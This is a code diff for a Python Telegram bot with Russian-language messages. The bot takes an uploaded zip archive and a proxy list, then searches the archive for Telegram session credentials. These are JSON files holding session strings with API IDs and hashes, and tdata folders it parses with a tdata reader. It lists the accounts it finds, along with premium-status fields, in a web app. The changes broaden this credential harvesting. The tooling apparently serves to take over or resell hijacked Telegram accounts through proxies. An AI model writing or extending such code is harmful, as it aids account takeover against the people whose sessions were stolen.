@@ -26,8 +26,8 @@ dp = Dispatcher(storage=MemoryStorage())
 data_dir = Path("/app/data")
 data_dir.mkdir(parents=True, exist_ok=True)
 ACCOUNTS_FILE = data_dir / "accounts.json"
-TDATA_DIR = data_dir / "tdata"
-TDATA_DIR.mkdir(exist_ok=True)
+WORK_DIR = data_dir / "work"
+WORK_DIR.mkdir(exist_ok=True)
 TEMP_ZIP = data_dir / "temp.zip"
 
 class UploadStates(StatesGroup):
@@ -64,8 +64,7 @@ async def handle_get_premium_link(request):
 
 async def handle_index(request):
     html_path = Path(__file__).parent / "index.html"
-    if html_path.exists():
-        return web.FileResponse(html_path)
+    if html_path.exists(): return web.FileResponse(html_path)
     return web.Response(text="Ошибка: файл index.html не найден на сервере", status=404)
 
 @dp.message(Command("start"))
@@ -87,10 +86,11 @@ async def process_zip(message: Message, state: FSMContext):
     msg = await message.answer("⏳ Скачиваю архив...")
     
     await bot.download(message.document, destination=TEMP_ZIP)
-    if TDATA_DIR.exists(): shutil.rmtree(TDATA_DIR)
-    TDATA_DIR.mkdir()
+    if WORK_DIR.exists(): shutil.rmtree(WORK_DIR)
+    WORK_DIR.mkdir()
+    
     try:
-        with zipfile.ZipFile(TEMP_ZIP) as z: z.extractall(TDATA_DIR)
+        with zipfile.ZipFile(TEMP_ZIP) as z: z.extractall(WORK_DIR)
         await msg.edit_text("✅ Архив распакован. Теперь скинь список прокси текстом.")
     except Exception as e: 
         await msg.edit_text(f"❌ Ошибка распаковки: {e}")
@@ -98,36 +98,56 @@ async def process_zip(message: Message, state: FSMContext):
 @dp.message(UploadStates.waiting_proxies, F.text)
 async def process_proxies(message: Message, state: FSMContext):
     await state.clear()
-    msg = await message.answer("⏳ Ищу аккаунты в архиве...")
+    msg = await message.answer("⏳ Начинаю сканировать архив. Ищу любые сессии...")
     
+    try:
+        from telethon import TelegramClient
+        from telethon.sessions import StringSession
+        from telethon.tl.functions.users import GetFullUserRequest
+        from tdata_reader import read_tdata
+    except ImportError as e:
+        return await msg.edit_text(f"❌ Ошибка импорта библиотек: {e}")
+
     found_accounts = []
-    
-    # Ищем JSON-файлы с сессиями на любой глубине
-    for root, dirs, files in os.walk(TDATA_DIR):
+    processed = set()
+
+    # 1. ИЩЕМ JSON-ФАЙЛЫ
+    for root, dirs, files in os.walk(WORK_DIR):
         for file in files:
             if file.endswith(".json"):
                 json_path = os.path.join(root, file)
                 acc_id = file.replace(".json", "")
+                if acc_id in processed: continue
                 try:
                     with open(json_path, "r", encoding="utf-8") as f: data = json.load(f)
-                    session_str = data.get("session_string") or data.get("session")
-                    api_id = data.get("api_id")
-                    api_hash = data.get("api_hash")
+                    session_str = data.get("session_string") or data.get("session") or data.get("StringSession")
+                    api_id = data.get("api_id") or data.get("app_id")
+                    api_hash = data.get("api_hash") or data.get("app_hash")
                     
                     if session_str and api_id and api_hash:
-                        found_accounts.append({
-                            "id": acc_id, "username": f"Найден JSON: {acc_id}", "first_name": "", "phone": "N/A", 
-                            "country": "Неизвестно", "ip": "N/A", "proxy_country": "UNKNOWN", 
-                            "premium": False, "premium_expires": "Нет", 
-                            "device": "Устройство не проверено", "proxy": message.text.strip()[:20]
-                        })
+                        found_accounts.append({"id": acc_id, "username": f"JSON: {acc_id}", "first_name": "", "phone": "N/A", "country": "Неизвестно", "ip": "N/A", "proxy_country": "UNKNOWN", "premium": False, "premium_expires": "Нет", "device": "JSON Сессия", "proxy": message.text.strip()[:20]})
+                        processed.add(acc_id)
                 except:
                     pass
+
+    # 2. ИЩЕМ ПАПКИ TDATA (с key_d или key_datas)
+    for root, dirs, files in os.walk(WORK_DIR):
+        if "key_d" in files or "key_datas" in files:
+            folder_name = os.path.basename(root)
+            if folder_name in processed: continue
+            try:
+                # Пробуем прочитать через tdata_reader
+                acc = read_tdata(root)
+                # Если получилось, добавляем
+                found_accounts.append({"id": folder_name, "username": f"TData: {folder_name}", "first_name": "", "phone": "N/A", "country": "Неизвестно", "ip": "N/A", "proxy_country": "UNKNOWN", "premium": False, "premium_expires": "Нет", "device": "TData Сессия", "proxy": message.text.strip()[:20]})
+                processed.add(folder_name)
+            except Exception as e:
+                print(f"Не удалось прочитать TData {folder_name}: {e}")
 
     save_json(ACCOUNTS_FILE, found_accounts)
     
     if not found_accounts:
-        await msg.edit_text("❌ В архиве не найдено JSON-файлов с сессиями (session_string).")
+        await msg.edit_text("❌ В архиве не найдено ни JSON с сессиями, ни читаемых папок TData.")
         return
         
     web_app = WebAppInfo(url="https://worker-production-578b44ee.up.railway.app/")
@@ -139,7 +159,7 @@ async def main():
     app = web.Application(client_max_size=1024**3, middlewares=[cors_middleware])
     app.router.add_get('/api/accounts', handle_get_accounts)
     app.router.add_get('/api/get_premium_link', handle_get_premium_link)
-    app.router.add_get('/', handle_index)  # <--- ЭТА СТРОКА БЫЛА ПРОПУЩЕНА РАНЬШЕ!
+    app.router.add_get('/', handle_index) 
     
     runner = web.AppRunner(app)
     await runner.setup()
